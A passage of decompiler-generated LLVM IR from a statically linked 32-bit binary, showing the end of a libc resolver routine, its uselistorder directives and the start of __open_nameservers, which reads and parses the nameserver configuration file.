  br i1 %v13_8057dc4, label %dec_label_pc_8057dc4.dec_label_pc_8057dda_crit_edge, label %dec_label_pc_8057dcb

dec_label_pc_8057dc4.dec_label_pc_8057dda_crit_edge: ; preds = %dec_label_pc_8057dc4
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_8057dda

dec_label_pc_8057dcb:                             ; preds = %dec_label_pc_8057dc4
  %v3_8057dce = load i32, i32* %v2_8057dc4, align 4
  %v5_8057dce = add i32 %v0_8057dc4, -16
  %v6_8057dce = inttoptr i32 %v5_8057dce to i32*
  store i32 %v3_8057dce, i32* %v6_8057dce, align 4
  %v1_8057dd2 = sext i16 %stack_var_-180.1 to i32
  %v2_8057dd2 = call i32 @__libc_close(i32 %v1_8057dd2)
  store i32 %v2_8057dd2, i32* %eax.global-to-local, align 4
  %v0_8057dd7 = load i32, i32* @esp, align 4
  %v1_8057dd7 = add i32 %v0_8057dd7, 16
  br label %dec_label_pc_8057dda

dec_label_pc_8057dda:                             ; preds = %dec_label_pc_8057dc4.dec_label_pc_8057dda_crit_edge, %dec_label_pc_8057dcb
  %v1_8057de1.pre-phi = phi i32 [ %.pre, %dec_label_pc_8057dc4.dec_label_pc_8057dda_crit_edge ], [ %v1_8057dd2, %dec_label_pc_8057dcb ]
  %v0_8057dda = phi i32 [ %v0_8057dc4, %dec_label_pc_8057dc4.dec_label_pc_8057dda_crit_edge ], [ %v1_8057dd7, %dec_label_pc_8057dcb ]
  %v1_8057ddd = add i32 %v0_8057dda, 12
  %v2_8057ddd = inttoptr i32 %v1_8057ddd to i32*
  %v3_8057ddd = load i32, i32* %v2_8057ddd, align 4
  %v5_8057ddd = add i32 %v0_8057dda, -16
  %v6_8057ddd = inttoptr i32 %v5_8057ddd to i32*
  store i32 %v3_8057ddd, i32* %v6_8057ddd, align 4
  %v2_8057de1 = call i32 @free(i32 %v1_8057de1.pre-phi)
  store i32 %v2_8057de1, i32* %eax.global-to-local, align 4
  %v1_8057de6 = load i32, i32* @esp, align 4
  %v2_8057de6 = inttoptr i32 %v1_8057de6 to i32*
  store i32 %v2_805771e, i32* %v2_8057de6, align 4
  %v2_8057de9 = call i32 @free(i32 %v1_8057de1.pre-phi)
  store i32 %v2_8057de9, i32* %eax.global-to-local, align 4
  %v0_8057dee = load i32, i32* @esp, align 4
  %v1_8057df1 = add i32 %v0_8057dee, 56
  %v2_8057df1 = inttoptr i32 %v1_8057df1 to i32*
  %v3_8057df1 = load i32, i32* %v2_8057df1, align 4
  %v13_8057df1 = icmp eq i32 %v3_8057df1, -1
  %v1_8057df6 = add i32 %v0_8057dee, 32
  %v2_8057df6 = inttoptr i32 %v1_8057df6 to i32*
  store i32 -1, i32* %v2_8057df6, align 4
  br i1 %v13_8057df1, label %dec_label_pc_8057dda.dec_label_pc_8057e4d_crit_edge, label %dec_label_pc_8057e00

dec_label_pc_8057dda.dec_label_pc_8057e4d_crit_edge: ; preds = %dec_label_pc_8057dda
  %v0_8057e4d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057e4d

dec_label_pc_8057e00:                             ; preds = %dec_label_pc_8057dda
  %v0_8057e00 = load i32, i32* @ecx, align 4
  %v1_8057e00 = load i32, i32* @esp, align 4
  %v2_8057e00 = add i32 %v1_8057e00, -4
  %v3_8057e00 = inttoptr i32 %v2_8057e00 to i32*
  store i32 %v0_8057e00, i32* %v3_8057e00, align 4
  %v1_8057e01 = add i32 %v1_8057e00, -8
  %v2_8057e01 = inttoptr i32 %v1_8057e01 to i32*
  store i32 ptrtoint (i8** @global_var_8067780.314 to i32), i32* %v2_8057e01, align 4
  %v1_8057e06 = add i32 %v1_8057e00, -12
  %v2_8057e06 = inttoptr i32 %v1_8057e06 to i32*
  store i32 134541533, i32* %v2_8057e06, align 4
  %v1_8057e0b = add i32 %v1_8057e00, 184
  store i32 %v1_8057e0b, i32* @ebx, align 4
  %v2_8057e12 = add i32 %v1_8057e00, -16
  %v3_8057e12 = inttoptr i32 %v2_8057e12 to i32*
  store i32 %v1_8057e0b, i32* %v3_8057e12, align 4
  %v4_8057e13 = inttoptr i32 %v1_8057de1.pre-phi to i32*
  %v5_8057e13 = call i32 @__pthread_cleanup_push_defer(i32* %v4_8057e13, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8057e13, i32* %eax.global-to-local, align 4
  %v0_8057e18 = load i32, i32* @esp, align 4
  %v1_8057e18 = inttoptr i32 %v0_8057e18 to i32*
  store i32 ptrtoint (i8** @global_var_8067780.314 to i32), i32* %v1_8057e18, align 4
  %v2_8057e1f = call i32 @pthread_mutex_lock(i32 %v1_8057de1.pre-phi)
  store i32 %v2_8057e1f, i32* %eax.global-to-local, align 4
  %v0_8057e24 = load i32, i32* @esp, align 4
  %v1_8057e24 = add i32 %v0_8057e24, 60
  %v2_8057e24 = inttoptr i32 %v1_8057e24 to i32*
  %v3_8057e24 = load i32, i32* %v2_8057e24, align 4
  store i32 %v3_8057e24, i32* %eax.global-to-local, align 4
  %v1_8057e28 = add i32 %v0_8057e24, 56
  %v2_8057e28 = inttoptr i32 %v1_8057e28 to i32*
  %v3_8057e28 = load i32, i32* %v2_8057e28, align 4
  store i32 %v3_8057e28, i32* %edx.global-to-local, align 4
  %v1_8057e2c = trunc i32 %v3_8057e24 to i16
  store i16 %v1_8057e2c, i16* @global_var_8062de4.316, align 4
  %v1_8057e32 = inttoptr i32 %v0_8057e24 to i32*
  %v2_8057e32 = load i32, i32* %v1_8057e32, align 4
  store i32 %v2_8057e32, i32* %eax.global-to-local, align 4
  %v3_8057e32 = add i32 %v0_8057e24, 4
  %v1_8057e33 = sext i32 %v3_8057e28 to i64
  store i64 %v1_8057e33, i64* @global_var_8067798.315, align 8
  %v1_8057e39 = inttoptr i32 %v3_8057e32 to i32*
  %v2_8057e39 = load i32, i32* %v1_8057e39, align 4
  store i32 %v2_8057e39, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8057e39, align 4
  %v0_8057e3c = load i32, i32* @ebx, align 4
  store i32 %v0_8057e3c, i32* %v1_8057e32, align 4
  %v4_8057e3d = call i32 @__pthread_cleanup_pop_restore(i32* %v4_8057e13, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8057e3d, i32* %eax.global-to-local, align 4
  %v0_8057e42 = load i32, i32* @esp, align 4
  %v1_8057e42 = add i32 %v0_8057e42, 32
  %v2_8057e42 = inttoptr i32 %v1_8057e42 to i32*
  store i32 -1, i32* %v2_8057e42, align 4
  br label %dec_label_pc_8057e4a

dec_label_pc_8057e4a:                             ; preds = %dec_label_pc_8057cbe, %dec_label_pc_8057e00
  %v0_8057e4a = load i32, i32* @esp, align 4
  %v1_8057e4a = add i32 %v0_8057e4a, 16
  br label %dec_label_pc_8057e4d

dec_label_pc_8057e4d:                             ; preds = %dec_label_pc_8057dda.dec_label_pc_8057e4d_crit_edge, %dec_label_pc_8057e4a
  %v0_8057e4d = phi i32 [ %v0_8057e4d.pre, %dec_label_pc_8057dda.dec_label_pc_8057e4d_crit_edge ], [ %v1_8057e4a, %dec_label_pc_8057e4a ]
  %v1_8057e4d = add i32 %v0_8057e4d, 16
  %v2_8057e4d = inttoptr i32 %v1_8057e4d to i32*
  %v3_8057e4d = load i32, i32* %v2_8057e4d, align 4
  store i32 %v3_8057e4d, i32* %eax.global-to-local, align 4
  %v1_8057e51 = add i32 %v0_8057e4d, 220
  %v1_8057e57 = inttoptr i32 %v1_8057e51 to i32*
  %v2_8057e57 = load i32, i32* %v1_8057e57, align 4
  store i32 %v2_8057e57, i32* @ebx, align 4
  %v3_8057e57 = add i32 %v0_8057e4d, 224
  %v1_8057e58 = inttoptr i32 %v3_8057e57 to i32*
  %v2_8057e58 = load i32, i32* %v1_8057e58, align 4
  store i32 %v2_8057e58, i32* @esi, align 4
  %v3_8057e58 = add i32 %v0_8057e4d, 228
  %v1_8057e59 = inttoptr i32 %v3_8057e58 to i32*
  %v2_8057e59 = load i32, i32* %v1_8057e59, align 4
  store i32 %v2_8057e59, i32* @edi, align 4
  %v3_8057e59 = add i32 %v0_8057e4d, 232
  %v1_8057e5a = inttoptr i32 %v3_8057e59 to i32*
  %v2_8057e5a = load i32, i32* %v1_8057e5a, align 4
  store i32 %v2_8057e5a, i32* @ebp, align 4
  ret i32 %v3_8057e4d

; uselistorder directives
  uselistorder i32 %v0_8057e4d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8057e24, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057dda, { 1, 0 }
  uselistorder i32 %v1_8057de1.pre-phi, { 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8057d8c.pre, { 1, 0 }
  uselistorder i32 %v5_8057d5f, { 1, 0 }
  uselistorder i32 %v3_8057d5f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8057d27, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8057cf0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8057cbe, { 1, 0 }
  uselistorder i32 %v3_8057c9d, { 1, 0, 2 }
  uselistorder i32 %v0_8057c8e, { 1, 0 }
  uselistorder i32 %v5_8057c84, { 1, 0 }
  uselistorder i32* %v3_8057c84, { 1, 0 }
  uselistorder i32 %v0_8057b5a67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8057c84, { 2, 1, 0 }
  uselistorder i32 %v5_8057c7e, { 1, 0 }
  uselistorder i32 %v1_8057c7d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8057c79, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8057c3d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8057c17, { 1, 0 }
  uselistorder i32 %v1_8057c08, { 1, 0 }
  uselistorder i32 %v3_8057bd9, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8057bc7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8057b6e, { 1, 2, 0 }
  uselistorder i32 %v0_8057b6e, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8057b48, { 1, 0 }
  uselistorder i32 %v0_8057b50, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_8057b3e, { 1, 0, 2 }
  uselistorder i32 %v5_8057aea, { 1, 0 }
  uselistorder i32* %v2_8057aea, { 1, 0, 2 }
  uselistorder i32 %v3_8057aa2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8057a88, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_8057a67, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8057a47, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80579ed, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80579d2, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80579bb, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8057943, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80578f6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80578d7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80578bb, { 1, 0 }
  uselistorder i32 %v3_80578b0, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_80578ad, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8057852, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_805784d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8057836, { 1, 0 }
  uselistorder i32 %v1_8057802, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80577f383, { 2, 1, 0 }
  uselistorder i16 %v0_80577b3, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_80577ac, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805771e, { 5, 4, 6, 3, 2, 11, 8, 1, 0, 10, 7, 9, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 97, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 51, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 83, 80, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 148, { 0, 13, 11, 1, 2, 3, 4, 5, 6, 7, 12, 8, 9, 10 }
  uselistorder i32 68, { 5, 2, 7, 8, 0, 6, 3, 4, 1, 9 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 100, { 0, 6, 7, 2, 3, 1, 4, 5 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 88, { 0, 9, 10, 11, 12, 16, 3, 4, 5, 6, 7, 8, 2, 15, 1, 13, 14 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 ()* @__libc_poll, { 1, 2, 0 }
  uselistorder i32 228, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32 232, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 176, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @inet_addr, { 2, 6, 5, 4, 3, 0, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1, 3, 7, 5, 4, 6 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32* inttoptr (i32 -1 to i32*), { 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder i32 200, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 3, 0, 4, 5, 1, 2 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 0, 2, 3, 1 }
  uselistorder i32 72, { 5, 8, 9, 6, 10, 4, 3, 2, 7, 0, 1 }
  uselistorder i32 84, { 10, 0, 11, 1, 13, 12, 2, 7, 8, 3, 4, 5, 6, 9 }
  uselistorder i32 -12, { 17, 11, 10, 12, 1, 13, 14, 15, 16, 18, 19, 20, 9, 22, 23, 21, 24, 25, 26, 27, 28, 2, 0, 29, 52, 50, 51, 3, 34, 30, 4, 31, 32, 33, 35, 36, 5, 48, 37, 49, 53, 45, 44, 6, 40, 7, 8, 41, 42, 43, 38, 39, 46, 47 }
  uselistorder i16* @global_var_8062de4.316, { 2, 1, 0 }
  uselistorder i64* @global_var_8067798.315, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8067780.314 to i32), { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8057e4d, { 1, 0 }
  uselistorder label %dec_label_pc_8057e4a, { 1, 0 }
  uselistorder label %dec_label_pc_8057dda, { 1, 0 }
  uselistorder label %dec_label_pc_8057dc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057db1, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8057d8c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8057d84, { 1, 0 }
  uselistorder label %dec_label_pc_8057d6b, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8057d20, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8057cbe, { 1, 0 }
  uselistorder label %dec_label_pc_8057c8e, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8057c84, { 1, 0 }
  uselistorder label %dec_label_pc_8057c79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057c76, { 1, 0 }
  uselistorder label %dec_label_pc_8057bf1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057b48, { 1, 0 }
  uselistorder label %dec_label_pc_80579bb, { 1, 0 }
  uselistorder label %dec_label_pc_8057984, { 1, 0 }
  uselistorder label %dec_label_pc_80578f6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057802, { 1, 0 }
  uselistorder label %dec_label_pc_80577ec, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8057e5c = load i32, i32* @ebp, align 4
  %v0_8057e5d = load i32, i32* @edi, align 4
  %v0_8057e5e = load i32, i32* @esi, align 4
  store i32 134541533, i32* %stack_var_-216, align 4
  %v3_8057e6b = ptrtoint i32* %stack_var_-216 to i32
  %v4_8057e78 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8062de8.231 to i32))
  %v1_8057e84 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062de8.231 to i32))
  store i32 %v1_8057e84, i32* @eax, align 4
  %v0_8057e8c = load i32, i32* @global_var_8067e60.232, align 32
  %tmp41 = icmp slt i32 %v0_8057e8c, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8058083, label %dec_label_pc_8057e99

dec_label_pc_8057e99:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805cfdc.319 to i32), i32* %stack_var_-216, align 4
  %v2_8057ea5 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805cfaa.320 to i32), i32 ptrtoint (i32* @global_var_805cfdc.319 to i32))
  store i32 %v2_8057ea5, i32* @eax, align 4
  %v1_8057ead = icmp eq i32 %v2_8057ea5, 0
  store i32 %v2_8057ea5, i32* @ebp, align 4
  %v1_8057eb1 = icmp eq i1 %v1_8057ead, false
  br i1 %v1_8057eb1, label %dec_label_pc_805804e.preheader, label %dec_label_pc_8057eb7

dec_label_pc_8057eb7:                             ; preds = %dec_label_pc_8057e99
  store i32 ptrtoint (i32* @global_var_805cfdc.319 to i32), i32* %stack_var_-216, align 4
  %v2_8057ec3 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805cfbb.321 to i32), i32 ptrtoint (i32* @global_var_805cfdc.319 to i32))
  %v1_8057ecb = icmp eq i32 %v2_8057ec3, 0
  store i32 %v2_8057ec3, i32* @ebp, align 4
  %v1_8057ecf = icmp eq i1 %v1_8057ecb, false
  br i1 %v1_8057ecf, label %dec_label_pc_805804e.preheader, label %dec_label_pc_8058078

dec_label_pc_805804e.preheader:                   ; preds = %dec_label_pc_8057e99, %dec_label_pc_8057eb7
  %v2_8058055 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8057f89 = add i32 %v3_8057e6b, 164
  %v4_8057f78 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_805804e

dec_label_pc_8057eda:                             ; preds = %dec_label_pc_8057ee5
  %v1_8057eda = add i32 %v0_8057eda56, 1
  store i32 %v1_8057eda, i32* @ebx, align 4
  %v1_8057edb = inttoptr i32 %v1_8057eda to i8*
  %v2_8057edb = load i8, i8* %v1_8057edb, align 1
  %v3_8057edb = zext i8 %v2_8057edb to i32
  %v5_8057edb = and i32 %v6_8057edb59, -256
  %v6_8057edb = or i32 %v3_8057edb, %v5_8057edb
  store i32 %v6_8057edb, i32* @ecx, align 4
  %v4_8057edd = icmp eq i8 %v2_8057edb, 0
  br i1 %v4_8057edd, label %dec_label_pc_805804e, label %dec_label_pc_8057ee5

dec_label_pc_8057ee5:                             ; preds = %dec_label_pc_8057ee5.lr.ph, %dec_label_pc_8057eda
  %v6_8057edb59 = phi i32 [ %v6_8057edb53, %dec_label_pc_8057ee5.lr.ph ], [ %v6_8057edb, %dec_label_pc_8057eda ]
  %v2_8057edb58 = phi i8 [ %v2_8057edb50, %dec_label_pc_8057ee5.lr.ph ], [ %v2_8057edb, %dec_label_pc_8057eda ]
  %v1_8057edb57 = phi i8* [ %v1_8057edb49, %dec_label_pc_8057ee5.lr.ph ], [ %v1_8057edb, %dec_label_pc_8057eda ]
  %v0_8057eda56 = phi i32 [ %v0_8057edb.pre, %dec_label_pc_8057ee5.lr.ph ], [ %v1_8057eda, %dec_label_pc_8057eda ]
  store i32 %v0_8057ee5.pre, i32* @eax, align 4
  %v2_8057eea = sext i8 %v2_8057edb58 to i32
  store i32 %v2_8057eea, i32* @edx, align 4
  %v2_8057eed = mul nsw i32 %v2_8057eea, 2
  %v3_8057eed = add i32 %v0_8057ee5.pre, %v2_8057eed
  %v4_8057eed = inttoptr i32 %v3_8057eed to i8*
  %v5_8057eed = load i8, i8* %v4_8057eed, align 1
  %v6_8057eed = and i8 %v5_8057eed, 32
  %v7_8057eed = icmp eq i8 %v6_8057eed, 0
  %v1_8057ef1 = icmp eq i1 %v7_8057eed, false
  br i1 %v1_8057ef1, label %dec_label_pc_8057eda, label %dec_label_pc_8057ef3

dec_label_pc_8057ef3:                             ; preds = %dec_label_pc_8057ee5
  %v10_8057ef3 = icmp eq i8 %v2_8057edb58, 10
  br i1 %v10_8057ef3, label %dec_label_pc_805804e, label %dec_label_pc_8057efc

dec_label_pc_8057efc:                             ; preds = %dec_label_pc_8057ef3
  %v10_8057efc = icmp eq i8 %v2_8057edb58, 35
  %v1_8057f07 = icmp eq i1 %v10_8057efc, false
  br i1 %v1_8057f07, label %dec_label_pc_8057f58.preheader, label %dec_label_pc_805804e

dec_label_pc_8057f58.preheader:                   ; preds = %dec_label_pc_8057efc
  %v2_8057f586 = load i8, i8* %v1_8057edb57, align 1
  %v3_8057f587 = icmp eq i8 %v2_8057f586, 0
  br i1 %v3_8057f587, label %dec_label_pc_8057f64, label %dec_label_pc_8057f5d

dec_label_pc_8057f0e:                             ; preds = %dec_label_pc_8057f5d
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8057f12 = load i32, i32* @esp, align 4
  %v3_8057f12 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8057f12 = add nuw nsw i32 %v3_8057f12, 152
  %v5_8057f12 = add i32 %v4_8057f12, %v1_8057f12
  %v6_8057f12 = inttoptr i32 %v5_8057f12 to i32*
  store i32 %v0_8057f12, i32* %v6_8057f12, align 4
  %v0_8057f1c.pre = load i32, i32* @ebx, align 4
  %v4_8057f1c.pre = load i32, i32* @ecx, align 4
  %v1_8057f1c60 = inttoptr i32 %v0_8057f1c.pre to i8*
  %v2_8057f1c61 = load i8, i8* %v1_8057f1c60, align 1
  %v3_8057f1c62 = zext i8 %v2_8057f1c61 to i32
  %v5_8057f1c63 = and i32 %v4_8057f1c.pre, -256
  %v6_8057f1c64 = or i32 %v3_8057f1c62, %v5_8057f1c63
  %v4_8057f1e65 = icmp eq i8 %v2_8057f1c61, 0
  br i1 %v4_8057f1e65, label %dec_label_pc_8057f3b.preheader, label %dec_label_pc_8057f22.lr.ph

dec_label_pc_8057f22.lr.ph:                       ; preds = %dec_label_pc_8057f0e
  %v0_8057f22.pre = load i32, i32* @global_var_8062dc0, align 64
  br label %dec_label_pc_8057f22

dec_label_pc_8057f1b:                             ; preds = %dec_label_pc_8057f30
  %v1_8057f1b = add i32 %v0_8057f1b67, 1
  store i32 %v1_8057f1b, i32* @ebx, align 4
  %v1_8057f1c = inttoptr i32 %v1_8057f1b to i8*
  %v2_8057f1c = load i8, i8* %v1_8057f1c, align 1
  %v3_8057f1c = zext i8 %v2_8057f1c to i32
  %v5_8057f1c = and i32 %v6_8057f1c69, -256
  %v6_8057f1c = or i32 %v3_8057f1c, %v5_8057f1c
  %v4_8057f1e = icmp eq i8 %v2_8057f1c, 0
  br i1 %v4_8057f1e, label %dec_label_pc_8057f3b.preheader, label %dec_label_pc_8057f22

dec_label_pc_8057f22:                             ; preds = %dec_label_pc_8057f22.lr.ph, %dec_label_pc_8057f1b
  %v6_8057f1c69 = phi i32 [ %v6_8057f1c64, %dec_label_pc_8057f22.lr.ph ], [ %v6_8057f1c, %dec_label_pc_8057f1b ]
  %v2_8057f1c68 = phi i8 [ %v2_8057f1c61, %dec_label_pc_8057f22.lr.ph ], [ %v2_8057f1c, %dec_label_pc_8057f1b ]
  %v0_8057f1b67 = phi i32 [ %v0_8057f1c.pre, %dec_label_pc_8057f22.lr.ph ], [ %v1_8057f1b, %dec_label_pc_8057f1b ]
  store i32 %v0_8057f22.pre, i32* @eax, align 4
  %v2_8057f27 = sext i8 %v2_8057f1c68 to i32
  store i32 %v2_8057f27, i32* @edx, align 4
  %v2_8057f2a = mul nsw i32 %v2_8057f27, 2
  %v3_8057f2a = add i32 %v0_8057f22.pre, %v2_8057f2a
  %v4_8057f2a = inttoptr i32 %v3_8057f2a to i8*
  %v5_8057f2a = load i8, i8* %v4_8057f2a, align 1
  %v6_8057f2a = and i8 %v5_8057f2a, 32
  %v7_8057f2a = icmp eq i8 %v6_8057f2a, 0
  %v1_8057f2e = icmp eq i1 %v7_8057f2a, false
  br i1 %v1_8057f2e, label %dec_label_pc_8057f3b.preheader, label %dec_label_pc_8057f30

dec_label_pc_8057f30:                             ; preds = %dec_label_pc_8057f22
  %v10_8057f30 = icmp eq i8 %v2_8057f1c68, 10
  %v1_8057f33 = icmp eq i1 %v10_8057f30, false
  br i1 %v1_8057f33, label %dec_label_pc_8057f1b, label %dec_label_pc_8057f3b.preheader

dec_label_pc_8057f3b.preheader:                   ; preds = %dec_label_pc_8057f30, %dec_label_pc_8057f22, %dec_label_pc_8057f1b, %dec_label_pc_8057f0e
  %v0_8057f1b.lcssa = phi i32 [ %v0_8057f1c.pre, %dec_label_pc_8057f0e ], [ %v1_8057f1b, %dec_label_pc_8057f1b ], [ %v0_8057f1b67, %dec_label_pc_8057f22 ], [ %v0_8057f1b67, %dec_label_pc_8057f30 ]
  %v6_8057f1c.lcssa = phi i32 [ %v6_8057f1c64, %dec_label_pc_8057f0e ], [ %v6_8057f1c, %dec_label_pc_8057f1b ], [ %v6_8057f1c69, %dec_label_pc_8057f22 ], [ %v6_8057f1c69, %dec_label_pc_8057f30 ]
  %v1_8057f3b75 = inttoptr i32 %v0_8057f1b.lcssa to i8*
  %v2_8057f3b76 = load i8, i8* %v1_8057f3b75, align 1
  %v3_8057f3b77 = zext i8 %v2_8057f3b76 to i32
  %v5_8057f3b78 = and i32 %v6_8057f1c.lcssa, -256
  %v6_8057f3b79 = or i32 %v3_8057f3b77, %v5_8057f3b78
  store i32 %v6_8057f3b79, i32* @ecx, align 4
  %v4_8057f3d80 = icmp eq i8 %v2_8057f3b76, 0
  br i1 %v4_8057f3d80, label %dec_label_pc_8057f54, label %dec_label_pc_8057f41

dec_label_pc_8057f37:                             ; preds = %dec_label_pc_8057f4f, %dec_label_pc_8057f41
  store i8 0, i8* %v1_8057f3b83, align 1
  %v0_8057f3a = load i32, i32* @ebx, align 4
  %v1_8057f3a = add i32 %v0_8057f3a, 1
  store i32 %v1_8057f3a, i32* @ebx, align 4
  %v4_8057f3b.pre = load i32, i32* @ecx, align 4
  %v1_8057f3b = inttoptr i32 %v1_8057f3a to i8*
  %v2_8057f3b = load i8, i8* %v1_8057f3b, align 1
  %v3_8057f3b = zext i8 %v2_8057f3b to i32
  %v5_8057f3b = and i32 %v4_8057f3b.pre, -256
  %v6_8057f3b = or i32 %v3_8057f3b, %v5_8057f3b
  store i32 %v6_8057f3b, i32* @ecx, align 4
  %v4_8057f3d = icmp eq i8 %v2_8057f3b, 0
  br i1 %v4_8057f3d, label %dec_label_pc_8057f54, label %dec_label_pc_8057f41

dec_label_pc_8057f41:                             ; preds = %dec_label_pc_8057f3b.preheader, %dec_label_pc_8057f37
  %v2_8057f3b84 = phi i8 [ %v2_8057f3b, %dec_label_pc_8057f37 ], [ %v2_8057f3b76, %dec_label_pc_8057f3b.preheader ]
  %v1_8057f3b83 = phi i8* [ %v1_8057f3b, %dec_label_pc_8057f37 ], [ %v1_8057f3b75, %dec_label_pc_8057f3b.preheader ]
  %v0_8057f5882 = phi i32 [ %v1_8057f3a, %dec_label_pc_8057f37 ], [ %v0_8057f1b.lcssa, %dec_label_pc_8057f3b.preheader ]
  %v0_8057f41 = load i32, i32* @global_var_8062dc0, align 64
  store i32 %v0_8057f41, i32* @eax, align 4
  %v2_8057f46 = sext i8 %v2_8057f3b84 to i32
  store i32 %v2_8057f46, i32* @edx, align 4
  %v2_8057f49 = mul nsw i32 %v2_8057f46, 2
  %v3_8057f49 = add i32 %v0_8057f41, %v2_8057f49
  %v4_8057f49 = inttoptr i32 %v3_8057f49 to i8*
  %v5_8057f49 = load i8, i8* %v4_8057f49, align 1
  %v6_8057f49 = and i8 %v5_8057f49, 32
  %v7_8057f49 = icmp eq i8 %v6_8057f49, 0
  %v1_8057f4d = icmp eq i1 %v7_8057f49, false
  br i1 %v1_8057f4d, label %dec_label_pc_8057f37, label %dec_label_pc_8057f4f

dec_label_pc_8057f4f:                             ; preds = %dec_label_pc_8057f41
